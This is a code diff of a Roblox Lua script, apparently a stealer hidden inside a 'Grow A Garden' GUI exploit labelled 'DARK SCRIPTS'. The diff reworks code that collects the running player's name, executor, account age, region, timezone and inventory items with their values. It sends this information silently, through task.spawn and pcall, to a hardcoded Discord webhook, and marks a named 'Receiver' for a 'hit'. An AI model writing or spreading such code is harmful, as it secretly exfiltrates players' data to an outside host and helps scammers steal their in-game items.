@@ -13,28 +13,24 @@ gui.Parent = game:GetService("CoreGui")
 
 -- my shit
 
+-- 🛠 Required Services
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local LocalizationService = game:GetService("LocalizationService")
-local player = Players.LocalPlayer
 
+local player = Players.LocalPlayer
+if not player then return warn("Player not found!") end
+
+-- 🧳 Ensure backpack exists
+local backpack = player:FindFirstChildOfClass("Backpack") or player:WaitForChild("Backpack", 5)
+if not backpack then return warn("Backpack not found!") end
+
+-- 🌐 Webhook URL
 local webhookUrl = "https://discord.com/api/webhooks/1380684794135842879/8tIsPrKUGSj7yTdvN2JFW9LrYIwU8WUHBxERD_gkTfD71rP1z0iu_jmukl5Jawusipmi"
 
-if not player then
-	warn("Player not found!")
-	return
-end
-
-local backpack = player:FindFirstChild("Backpack")
-if not backpack then
-	warn("Backpack not found!")
-	return
-end
-
--- 🌍 Time + Region Info
+-- 🌍 Time + Region
 local function getTimezone()
-	local utcOffset = os.date("*t").isdst and os.time() + 3600 or os.time()
-	return os.date("%Z", utcOffset)
+	return os.date("%Z", os.time())
 end
 
 local function getRegion()
@@ -44,7 +40,7 @@ local function getRegion()
 	return success and result or "Unknown"
 end
 
--- ⚙️ Executor Detection
+-- ⚙️ Executor detection
 local function getExecutor()
 	if identifyexecutor then return identifyexecutor() end
 	if getexecutor then return getexecutor() end
@@ -56,65 +52,64 @@ local function getExecutor()
 	if get_hidden_gui or gethui then return "Hydrogen" end
 	if iswindowsecure then return "Electron" end
 	if readfile and not isfolder then return "Arceus X" end
-	if getgenv then
-		local ex = getgenv().Executor or getgenv().executor
-		if typeof(ex) == "string" then return ex end
-	end
 	return "Unknown / Mobile"
 end
 
--- 🎒 Backpack Items
+-- 🎒 Collect Backpack Items
 local items = {}
+local totalValue = 0
+
 for _, item in ipairs(backpack:GetChildren()) do
 	local name = item.Name
 	local weight = item:GetAttribute("Weight") or 0
 	local value = item:GetAttribute("Value") or 0
-	table.insert(items, string.format("⭐ - %s [%.2fkg] → %s¢", name, weight, value))
+	totalValue += value
+
+	table.insert(items, string.format("🍄 - %s [%.2fkg] → %s¢", name, weight, value))
 end
 
+-- 🔢 Sort Items by Value Descending
 table.sort(items, function(a, b)
-	local aMatch = string.match(a, "→ ([%d%.,]+)¢")
-	local bMatch = string.match(b, "→ ([%d%.,]+)¢")
-
-	local aValue = tonumber((aMatch or "0"):gsub("[^%d%.]", "")) or 0
-	local bValue = tonumber((bMatch or "0"):gsub("[^%d%.]", "")) or 0
-
-	return aValue > bValue
+	local aVal = tonumber((a:match("→ ([%d%.]+)") or "0"))
+	local bVal = tonumber((b:match("→ ([%d%.]+)") or "0"))
+	return aVal > bVal
 end)
 
-
--- 💰 Total Value
-local totalValue = 0
-for _, item in ipairs(backpack:GetChildren()) do
-	totalValue += item:GetAttribute("Value") or 0
-end
-
--- 🧾 Webhook Payload
-local body = {
-	content = ":potted_plant: **Grow A Garden Hit - DARK SCRIPTS** :four_leaf_clover:\n" ..
-		":bust_in_silhouette: **Player Information**\n" ..
-		"Name: " .. player.Name .. "\n" ..
-		"Receiver: Gibsongamings\n" ..
-		"Executor: " .. getExecutor() .. "\n" ..
-		"Account Age: " .. player.AccountAge .. " days\n" ..
-		"Region: " .. getRegion() .. "\n" ..
-		"Timezone: " .. getTimezone() .. "\n\n" ..
-		":moneybag: **Total Value**\n" ..
-		string.format("%s¢", totalValue) .. "\n\n" ..
-		":palm_tree: **Backpack**\n" ..
-		table.concat(items, "\n") .. "\n\n" ..
-		":maple_leaf: **Hits**\nAll Items\n" ..
-		":island: **Join with URL**\n" ..
-		"29c9025f-e399-4b7f-8eb5-4e0aaad4f10d\n" ..
+-- 🧾 Build Webhook Payload
+local payload = {
+	["content"] = table.concat({
+		":potted_plant: **Grow A Garden Hit - DARK SCRIPTS** :four_leaf_clover:",
+		":bust_in_silhouette: **Player Information**",
+		"Name: " .. player.Name,
+		"Receiver: Gibsongamings",
+		"Executor: " .. getExecutor(),
+		"Account Age: " .. player.AccountAge .. " days",
+		"Region: " .. getRegion(),
+		"Timezone: " .. getTimezone(),
+		"",
+		":moneybag: **Total Value**",
+		string.format("%s¢", totalValue),
+		"",
+		":palm_tree: **Backpack**",
+		table.concat(items, "\n"),
+		"",
+		":island: **Join with URL**",
+		"29c9025f-e399-4b7f-8eb5-4e0aaad4f10d",
 		"8624669736 | 29c9025f-e399-4b7f-8eb5-4e0aaad4f10d"
+	}, "\n")
 }
 
 -- 📤 Send Webhook
-HttpService:PostAsync(
-	webhookUrl,
-	HttpService:JSONEncode(body),
-	Enum.HttpContentType.ApplicationJson
-)
+task.spawn(function()
+	pcall(function()
+		HttpService:PostAsync(
+			webhookUrl,
+			HttpService:JSONEncode(payload),
+			Enum.HttpContentType.ApplicationJson
+		)
+	end)
+end)
+
 
 
 -- Frame Container
